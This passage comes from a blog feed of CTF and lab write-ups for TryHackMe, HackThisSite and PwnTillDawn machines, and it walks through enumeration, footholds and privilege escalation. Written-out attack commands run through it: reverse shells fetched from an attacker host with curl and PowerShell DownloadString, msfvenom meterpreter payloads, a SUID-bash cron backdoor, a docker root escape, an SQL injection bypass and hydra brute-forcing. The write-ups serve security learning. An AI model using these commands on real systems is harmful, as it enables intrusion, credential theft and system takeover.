/usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.196.34/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================09:15:58 Starting gobuster in directory enumeration mode===============================================================/hidden (Status: 301) [Size: 169] [--&gt; http://10.10.196.34/hidden/]/index.html (Status: 200) [Size: 612] /robots.txt (Status: 200) [Size: 43] ===============================================================We found the page /hidden and it has the following.Run another scan on this page.===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.196.34/hidden/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/whatever (Status: 301) [Size: 169] [--&gt; http://10.10.196.34/hidden/whatever/]===============================================================Found another directory saying it’s a dead end.View the source code by pressing ctrl + u.Found a base64 encoded string. Decode it to get first flag.The robots.txt file doesn’t have anything useful so let’s move to the other webserver.Start another directory scan, this time on port 65524 : gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10:65524/.===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.196.34:65524/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s=============================================================== 09:21:04 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 280]/.htaccess (Status: 403) [Size: 280]/.htpasswd (Status: 403) [Size: 280]/index.html (Status: 200) [Size: 10818]/robots.txt (Status: 200) [Size: 153] /server-status (Status: 403) [Size: 280] ===============================================================The robots.txt file contains the following.That looks like a hash, crack it for the second flag.index.html is just apache default page.Press ctrl + u to view the source code of the page.Found a hidden encoded string, use CyberChefWe got a page, let’s navigate to it: http://10.10.10.10:65524/n0th1ng3ls3m4tt3rLet’s view the source code.We found an image and a hash, let’s download the image, and try to crack the hash using the provided task file.Use john to crack the hash : john --wordlist=easypeasy.txt --format=gost hashWe got a password.FootholdLet’s download the image to our machine.Using the steghide and the password we cracked, let’s extract hidden files from the image.Great! We got a username and some binary code, let’s decode it on CyberChef.Using the credentials we found, login as boring via ssh.We are in.Privilege EscalationDoing some basic enumeration on the target, we found a cronjob.This script run every minute as root. Let’s see what the script does.We are the owner of the file, we can put a command that gives us root.I run the following command echo 'cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash' &gt;&gt; .mysecretcronjob.sh, what it does is add a script to the file that makes a copy of /bin/bash in /tmp and gives /bash suid bit so it can be run as it’s owner (root).Wait a little and the file will get copied to /tmp with suid bit.To get a root shell, run /tmp/bash -p.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "TryHackMe - Chill Hack", "url": "/posts/THM-ChillHack/", "categories": "TryHackMe", "tags": "tryhackme, linux, steganography, commandinjection, gobuster, john, cracking", "date": "2022-06-03 01:00:00 +0100", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing Chill Hack from TryHackMe.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. map scan report for 10.10.102.48 (10.10.102.48) Host is up (0.25s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.11.31.131 | Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text | Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)| 256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)|_ 256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Game Info|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelFound 3 open portsFTPFrom the nmap scan, we see that ftp allows anonymous login.Found note.txt file, and downloaded it with get note.txt.WebLet’s navigate to the webpage.Nothing interesting, let’s run a gobuster scan.Gobuster.We run a directory scan with the following command. gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.102.48/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s=============================================================== 09:57:28 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 277]/.htaccess (Status: 403) [Size: 277]/.htpasswd (Status: 403) [Size: 277]/css (Status: 301) [Size: 310] [--&gt; http://10.10.102.48/css/]/fonts (Status: 301) [Size: 312] [--&gt; http://10.10.102.48/fonts/]/images (Status: 301) [Size: 313] [--&gt; http://10.10.102.48/images/]/index.html (Status: 200) [Size: 35184] /js (Status: 301) [Size: 309] [--&gt; http://10.10.102.48/js/] /secret (Status: 301) [Size: 313] [--&gt; http://10.10.102.48/secret/]/server-status (Status: 403) [Size: 277] ===============================================================Found a directory called /secret.It seems that we can execute command, let’s try running a command like ls.Wow. The note we found earlier had the following: Anurodh told me that there is some filtering on strings being put in the command -- Apaar. So there is a command filter, that’s why we can’t run ls. Let’s try another command.I run the command whoami and got www-data as a result.If i tried to printout the /etc/passwd file i get blocked.We can try the command base64 to encode the content of the file and decode it later.We managed to get the encoded content, now let’s decode using cyberchefGreat! Now we can see every user in the system.Next, let’s print the index.php file of the command execution page in order to see the filters.We can see every word that is being filtered. We can see that the curl command is not black listed, so we can try to upload a reverse shell.FootholdFirst, let’s make our reverse shell payload.Now setup an http server using python: python3 -m http.server 80 in the same directory of the file.Next go to the command execution page and run curl http://{attacker_ip}/shell.sh -o /tmp/shell.sh. This command will upload our shell to the target system and pur it in /tmp directory since it is world writable.Now set up a listener on the attacker machine with nc -lvnp 1234Back to the command execution page and run bash&lt;/tmp/shell.shIf we go back to the listener we setup we should have received a reverse shell.I used the python pty trick to stabilize my shell.Privilege EscalationAnurodhPocking around the files in the machine, i found the following file.We got a message saying we need to “Look in the dark! You will find your answer”.The file attached to this message is “hacker-with-laptop_23-2147985341.jpg”, and it is located in “/var/www/files/images/”.Let’s download the file to our machine and investigate it.We need to setup a http server with python.And download the file with the following command: wget http://10.10.102.48:8000/hacker-with-laptop_23-2147985341.jpgLet’s see if there is any hidden file in this image. We can use a tool called stegseek to do that.Great! There is a backup.zip file. Let’s unzip it and see what’s there.We need a password to unzip the file. Let’s use zip2john to get a hash and crack the latter for a password.We got the password, now let’s unzip the file.We got a file named source_code.php, let’s see what it holds.We got a base64 encoded password and the username Anurodh. Let’s decode the password and login to Anurodh account.Great! I managed to login to Anurodh account via ssh.RootRun the command id.We that the user anurodh is in docker group, let’s visit GTFOBinsWe can run the command docker run -v /:/mnt --rm -it alpine chroot /mnt sh and become root.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).Referenceshttps://gtfobins.github.io/gtfobins/docker/#shell" }, { "title": "TryHackMe - H4cked", "url": "/posts/THM-H4cked/", "categories": "TryHackMe", "tags": "tryhackme, linux, wireshark, ftp, bruteforce, hydra", "date": "2022-06-01 01:00:00 +0100", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing H4cked from TryHackMe.Task1Let’s download the task file, open it with wireshark and start investigating.In the first packets of the capture, we see the attacker trying to connect to port 21, which is FTP.We see the attacker attempting to login to an ftp server trying multiple passwords with the user jenny. He must be using hydra to brute force the login.If we scrolled down through the packets we can see a successful login.To view the password, right click the packet and follow tcp stream.Scrolling down the packets, we can see the hackers own attempt after he stopped brute forcing.Right click one of those packets and follow tcp stream.Here we can see what the hacked did before exiting.After the attacked had logged in successfully, he was in /var/www/html directory, uploaded a file called shell.php, gave it full permissions and exited after that.We can see that he requested that file after that from his attacking machine, which gave his a reverse shell on the machine.Let’s now follow the tcp stream of that reverse shell and what did the attacker do.After gaining a shell, the attacking run the command whoami to see what user’s account he is using, and it was www-data.Since he knows jenny’s password, the attacker changed to that user with the command su jenny after stabilizing his shell with the command python3 -c 'import pty; pty.spawn(\"/bin/bash\")'.The attacker checked jenny’s permissions on the machine with the command sudo -l, and he found that he can run any command as root, so he simply changed the user to root with sudo su.We can see after that he cloned a repo from github called reptile, which is a rootkit.Task2The attacker has changed jenny’s password, so let’s replicate his steps and try to get into the machine.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.3.106 (10.10.3.106)Host is up (0.064s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)We see ftp on port 21 and http on port 80.FootholdSame as the hacker, let’s start brute forcing ftp server with hydra. hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.3.106 ftpGreat! We got the password, now let’s download the reverse shell code the attacker used here.Before uploading the file, we need to change the ip address to the one of our attacking machine.Now let’s login the the ftp server and upload the shell.After logging successfully, i used the command put to upload the reverse shell code (reverse.php), and don’t forget to change permission like i did, use chmod 777 reverse.php.Set up a netcat listener nc -lvnp 1234, and request the reverse.php file we uploaded, i used curl to do that. curl http://10.10.10.10/reverse.phpGreat! We got the reverse shell.Privilege EscalationFor this part, we saw the hacker use jenny’s ability to run any command as root and change the user to root, let’s do that.First, let’s run this command python3 -c 'import pty;pty.spawn(\"/bin/bash\")' to stabilize our shell.Change the user to jenny using the password found earlier, and run sudo su to change user to root.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).Referenceshttp://pentestmonkey.net/tools/php-reverse-shell" }, { "title": "TryHackMe - c4ptur3th3fl4g", "url": "/posts/THM-c4ptur3-th3-fl4g/", "categories": "TryHackMe", "tags": "tryhackme, easy, spectrogram, steganography, encoding", "date": "2022-05-29 01:00:00 +0100", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing c4ptur3th3fl4g from TryHackMe.Translation &amp; ShiftingTranslate, shift and decode the following.#1 : c4n y0u c4p7u23 7h3 f149?This one looks like leetspeak, we need to replace the numbers with their corresponding letters. 0 = O 1 = I 2 = Z 3 = E 4 = A 5 = S 6 = G 7 = T 8 = B 9 = g ans : can you capture the flag?#2 : 01101100 01100101 01110100 01110011 00100000 01110100 01110010 01111001 00100000 01110011 01101111 01101101 01100101 00100000 01100010 01101001 01101110 01100001 01110010 01111001 00100000 01101111 01110101 01110100 00100001This one is binary, we can go to CyberChef and convert it.#3 : MJQXGZJTGIQGS4ZAON2XAZLSEBRW63LNN5XCA2LOEBBVIRRHOM======This one looks a base. Let’s use CyberChef.It’s a bse32.#4 : RWFjaCBCYXNlNjQgZGlnaXQgcmVwcmVzZW50cyBleGFjdGx5IDYgYml0cyBvZiBkYXRhLg==This is base64.#5 : 68 65 78 61 64 65 63 69 6d 61 6c 20 6f 72 20 62 61 73 65 31 36 3fThis one is hex.#6 : Ebgngr zr 13 cynprf!I see the number 13, so i’m guessing it’s rot13.#7 : *@F DA:? &gt;6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:&gt;6DXThis is rot47.#8 : - . .-.. . -.-. — – – ..- -. .. -.-. .- - .This looks like morse code.#9 : 85 110 112 97 99 107 32 116 104 105 115 32 66 67 68This is decimal.#10 : LS0tLS0gLi0tLS0gLi0tLS0gLS0tLS0gLS0tLWe got a very long string here, let’s inspect it.We see that the string ends with an equal sign, which can be a base64.After we decoded it, it gave us a morse code.Morse code gave a hex code.The hex gives a rot47.We decode that and get decimal.And this was the final one.SpectrogramsA spectrogram is a visual representation of the spectrum of frequencies of a signal as it varies with time. When applied to an audio signal, spectrograms are sometimes called sonographs, voiceprints, or voicegrams. When the data is represented in a 3D plot they may be called waterfalls.Let’s download the task file and open it with sonic-visualizer.sonic-visualiser secretaudio.wavNow we need to add a spectrogram layer by going to Layer -&gt; Add Spectrogram or pressing shift + G.SteganographySteganography is the practice of concealing a file, message, image, or video within another file, message, image, or video.Let’s download the task file.In order to extract files from images, we can use a tool called steghide.Steghide extract -sh stegosteg.jpg`After that we submit an empty password.Security through obscuritySecurity through obscurity is the reliance in security engineering on the secrecy of the design or implementation as the main method of providing security for a system or component of a system.After downloading the task file, we run the command strings on the file.Strings meme.jpgAt the very end we can see the answer to the last questions.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "TryHackMe - Alfred", "url": "/posts/THM-Alfred/", "categories": "TryHackMe", "tags": "tryhackme, windows, easy, jenkins, powershell, metasploit, msfvenom, meterpreter", "date": "2022-05-27 01:00:00 +0100", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing Alfred from TryHackMe. Easy windows machine running Jenkins in a webserver. We use some known credentials to login to Jenkins and run some command that would give us a reverse shell. After that we generate a payload using msfvenom and upload it to the target to get a meterpreter shell that would make it easy to escalate our privileges on the machine.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.209.108Host is up (0.097s latency).Not shown: 997 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5|_http-title: Site doesn't have a title (text/html).| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.53389/tcp open tcpwrapped|_ssl-date: 2022-06-03T08:50:54+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=alfred| Not valid before: 2022-06-02T08:38:17|_Not valid after: 2022-12-02T08:38:178080/tcp open http Jetty 9.4.z-SNAPSHOT| http-robots.txt: 1 disallowed entry |_/|_http-title: Site doesn't have a title (text/html;charset=utf-8).|_http-server-header: Jetty(9.4.z-SNAPSHOT)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsWe got 3 ports open, webserver on port 80, probably rdp on port 3389, and another webserver on port 8080.WebLet’s go to the webserver on port 80.There is a picture of Bruce Wayne and some text, nothing really interesting.Let’s go to port 8080.It’s Jenkins login page. If we some of the most used credentials, we’ll be able to login successfully.FootholdWe need to find a place where we can execute command. To do that, go to project.Now go to configure.Great! We found a place to execute windows batch commands. Time for a reverse shell.First, we need to download this script and serve it with a webserver, we can use python for that: sudo python3 -m http.server 80.After that, we need to set up a listener to receive the shell: nc -lvnp 9001Now we need to put the following powershell command in place and run it.powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.31.131:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.31.131 -Port 9001 Change the ip addresses to yours(tun0)After entering the command, press save. Then go to Build nowNow if we go to our listener, we should see that we have received a shell.Privilege EscalationFor this part, we can upgrade our shell to meterpreter in order to easily escalate our privileges.First, let’s create a payload using msfvenom.msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.31.131 LPORT=1234 -f exe -o shell.exe Don’t forget to change the ip address.Good, let’s fire up metasploit and setup a handler listener.We need to set the options to the same ones we used when we created the payload with msfvenomGreat! Now in the same directory where we created the exploit, set up an http server like the one we did before:sudo python3 -m http.server 80 so that we can upload it to the target.After that we need to execute the following powershell command in the shell we just got to upload the exploit.powershell \"(New-Object System.Net.WebClient).Downloadfile('http://10.11.31.131/shell.exe','shell.exe')\"Great! We have uploaded the exploit successfully, now execute it with the command Start-Process \"shell.exe\"Now if we go to our listener on metasploit, we can see that we received a meterpreter shell.Now to have system privileges, which is the higher ranking in a windows machine, we execute the command getsystem.And we got it, but we need to understand how that worked. To do that, first drop a shell using the command shell, and then execute whoami /priv Do that as the user alfred not authority\\system.With that command, we can see the different tokens we have. One of the tokens we have is SeImpersonatePrivilege. To abuse that, let’s load a module named incognito and run the command impersonate_token \"BUILTIN\\Administrators\"We got system privileges. Now let’s go to the directory where the flag is and read it.We can’t, even though we have the higher privileged token. To solve that, we need to change the process we currently in to a process that has system privilege.First, list the processes with ps.We choose the services process, now use the command migrate with the process number of services.And we that, we have successfully rooted Alfred.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).Referenceshttps://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" }, { "title": "TryHackMe - Blueprint", "url": "/posts/THM-Blueprint/", "categories": "TryHackMe", "tags": "tryhackme, windows, metasploit, meterpreter, easy, msfvenom", "date": "2022-05-25 01:00:00 +0100", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing Blueprint from TryHackMe. It’s an easy windows machine running a software program with a version vulnerable to remote code execution.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.230.235 Host is up (0.28s latency). Not shown: 987 closed tcp ports (reset) PORT STATE SERVICE VERSION80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| http-methods: |_ Potentially risky methods: TRACE|_http-title: 404 - File or directory not found. |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)|_ssl-date: TLS randomness does not represent time|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28| tls-alpn: |_ http/1.1 |_http-title: Bad request!| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql MariaDB (unauthorized)8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28|_http-title: Index of /| http-methods: |_ Potentially risky methods: TRACE49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC49158/tcp open msrpc Microsoft Windows RPC49159/tcp open msrpc Microsoft Windows RPC49160/tcp open msrpc Microsoft Windows RPCService Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-05-29T10:06:54|_ start_date: 2022-05-29T09:57:47|_clock-skew: mean: -20m02s, deviation: 34m37s, median: -3s|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:b2:71:5d:06:29 (unknown)| smb-os-discovery: | OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)| OS CPE: cpe:/o:microsoft:windows_7::sp1| Computer name: BLUEPRINT| NetBIOS computer name: BLUEPRINT\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2022-05-29T11:06:52+01:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.1: |_ Message signing enabled but not requiredWe have a windows machine, running a webserver on port 80 and port 8080, SMB and mysql.WebLet’s navigate to the webpage on port 8080.It’s a directory, let’s see what it holds.We see oscommerce with what we assume to be a version number. Let’s search for oscommerce and see what we can find.OsCommerce is an online store management software program, and it is vulnerable to remote code execution in this exact version this machine is running.FootholdLet’s download the exploit and run it.Great! We got command execution and with elevated privileges.If we opened up metasploit, we can see that it also has a module for exploiting this service and even getting a reverse shell.Let’s set the necessary parameters up and run the module.Now let’s dump the hashes.We can’t do that because the current meterpreter we’re using (php/meterpreter) is not supported. Let’s upgrade to *windows/meterpreter.Shell StabilizationFirst, we need to create an executable using msfvenom with this command.msfvenom -p windows/meterpreter/reverse_tcp LHOST=Attacker_IP LPORT=1234 -f exe -o shell.exeGreat. Now we need to setup a listener on metasploit. We use exploit/multi/handler for that, and set the options LPORT, LHOST and payload. After that we run the module in the background with run -j. Press ctrl + z to background meterpreter and then select the handler.Great! Now let’s get back to our meterpreter session, and upload the executable. You need to start metasploit from the same directory where we created the executable, or specify the full path of the executable:(/path/to/the/executable.exe)We uploaded the file successfully, now let’s run it with the command execute -f shell.exe.Great! We got our session. Now background the old meterpreter session with ctrl + z and select the new one, in my case it’s session 10: sessions -i 10.Now we can run hashdump and get local users hashes.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackThisSite - Peace Poetry: HACKED", "url": "/posts/HTS-Realistic3/", "categories": "HackThisSite, Realistic", "tags": "hackthissite, hts, easy, web, realistic", "date": "2022-05-23 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing Peace Poetry: HACKED from HackThisSite, the 3rd challenge of the realistic missions.SolutionThe challenge has the following message.Let’s navigate to that page.We can see what the hacker has posted on the page, Let’s check the source code.At the bottom of the source code, we can see a comment from the hacker stating that the old website is still up, and he copied the old index.html file to oldindex.html. Let’s add that file to the url ‘https://www.hackthissite.org/missions/realistic/3/oldindex.html’Great! This is the original page.We can also see two sections, the first one is Read The Poetry where we can read different poems, and the other one is Submit Poetry, and it’s the one the hacker used to change the page.The way this form works is we specify a name for the poem and the poem itself. When we click add poem button, the program creates a file and name it with the poem name we choose earlier and writes the poem to the file, it’s looks something like this:echo \"The poem\" &gt; NameOfPoemSo if we choose a poem name and there is a file with the same name, we could delete the content of that file and replace it with what we put in the Poem.What the attacker did is choose the name of the poem as ../index.html and put the content he wanted to display as a poem. With that the program has replaced the content of index.html which is one directory up (../):echo \"hacker\" &gt; ../index.htmlTo solve the challenge, we need to specify the name of the poem as ../index.html and put the source code of oldindex.html file as a poem so that we can restore the old page.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackThisSite - Chicago American Nazi Party", "url": "/posts/HTS-Realistic2/", "categories": "HackThisSite, Realistic", "tags": "hackthissite, hts, easy, web, realistic", "date": "2022-05-21 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing Chicago American Nazi Party from HackThisSite, part of the realistic challenges.SolutionThe challenge has the following message.Let’s go to that Website.As we can see, this website belongs to a nazi party. Let’s check the source code.There is a link at the bottom of the page that goes to update.php page, let’s see what there.It’s a login page, let’s try some submitting some known credentials(admin:admin).Well, that was not necessary. Let’s try a sql injection by entering the this ' or 1=1 -- - for both username and password.Great! We solved the challenge.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackThisSite - Uncle Arnold's Local Band Review", "url": "/posts/HTS-Realistic1/", "categories": "HackThisSite, Realistic", "tags": "hackthissite, hts, easy, web, realistic", "date": "2022-05-19 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing Uncle Arnold’s Local Band Review from HackThisSite which is part of the realistic missions.SolutionThe challenge has the following message.Let’s navigate to that page.It’s a local brand review page, if we scroll down, we can see Raging Inferno is at the bottom and has the lowest rank.Let’s fire up burp suite and turn intercept on.Now let’s vote for our Raging Inferno brand and intercept the request.We can see the parameter responsible for voting is named vote, so let’s change it’s value to something higher.Let’s forward the request.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "PwnTillDawn - Stuntman Mike", "url": "/posts/PTD-Stuntman-Mike/", "categories": "PwnTillDawn", "tags": "pwntilldawn, linux, hydra", "date": "2022-05-17 01:00:00 +0100", "snippet": "DescriptionHello hackers, I hope you are doing well. We are doing Stuntman Mike from PwnTillDawn and Wizlynxgroup. This is an easy linux machine, running a ssh server on port 22 and a webserver on port 8089. When we try to connect to ssh, the server reveals some useful information, we use that to brute force ssh and we find valid credentials. After login to the machine via ssh, we find that we can run any command as root, so we can easily change user to root. Let’s get started.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.150.150.166Host is up (0.086s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 (protocol 2.0)| ssh-hostkey: | 2048 b7:9e:99:ed:7e:e0:d5:83:ad:c9:ba:7c:f1:bc:44:06 (RSA)| 256 7e:53:59:7b:2d:6c:3b:d7:21:28:cb:cb:78:af:99:78 (ECDSA)|_ 256 c5:d2:2d:04:f9:69:40:4c:15:34:36:fe:83:1f:f3:44 (ED25519)8089/tcp open ssl/http Splunk httpd| http-robots.txt: 1 disallowed entry |_/| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2019-10-25T09:15:13|_Not valid after: 2022-10-24T09:15:13There are two open ports, 22(SSH) and 8089(ssl/http).WebLet’s navigate to the webserver https://10.150.150.166:8089The webserver is running splunkd version 8.0.0, which there no vulnerabilities on this version.SSHLet’s try to connect to ssh.Wow, we got the flag and a username.FootholdLet’s brute force ssh using hydra.Great! We got the password for mike. Let’s login.$ ssh mike@10.150.150.166You are attempting to login to stuntman mike's server - FLAG35=724a2734e80ddbd78b2694dc5eb74db395403360mike@10.150.150.166's password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System load: 0.0 Processes: 166 Usage of /: 28.6% of 19.56GB Users logged in: 1 Memory usage: 20% IP address for ens33: 10.150.150.166 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch18 packages can be updated.0 updates are security updates.mike@stuntmanmike:~$ Privilege EscalationLet’s check our privileges wit sudo-lmike@stuntmanmike:~$ sudo -l[sudo] password for mike: Matching Defaults entries for mike on stuntmanmike: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser mike may run the following commands on stuntmanmike: (ALL : ALL) ALLmike@stuntmanmike:~$Great! We can run any command as root.Let’s get a root shell by running sudo su -mike@stuntmanmike:~$ sudo su -[sudo] password for mike: root@stuntmanmike:~# iduid=0(root) gid=0(root) groups=0(root)root@stuntmanmike:~#Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "TryHackMe - Steel Mountain", "url": "/posts/THM-SteelMountain/", "categories": "TryHackMe", "tags": "tryhackme, Windows, metasploit, msfvenom, usp", "date": "2022-05-15 01:00:00 +0100", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing Steel Mountain from TryHackMe. It’s a windows machine running a vulnerable webserver, the vulnerability permits us to execute commands remotely, so we used an exploit to get a reverse shell. Once we’re in the machine, we find a service with an unquoted service path, we create and exploit for that and use it to escalate our privileges.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.36.31Host is up (0.10s latency). Not shown: 989 closed tcp ports (reset) PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 8.5|_http-server-header: Microsoft-IIS/8.5 |_http-title: Site doesn't have a title (text/html). | http-methods: |_ Potentially risky methods: TRACE135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds3389/tcp open ssl/ms-wbt-server?| ssl-cert: Subject: commonName=steelmountain| Not valid before: 2022-05-15T09:46:41|_Not valid after: 2022-11-14T09:46:41|_ssl-date: 2022-05-16T10:19:46+00:00; 0s from scanner time.8080/tcp open http HttpFileServer httpd 2.3|_http-server-header: HFS 2.3|_http-title: HFS /49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 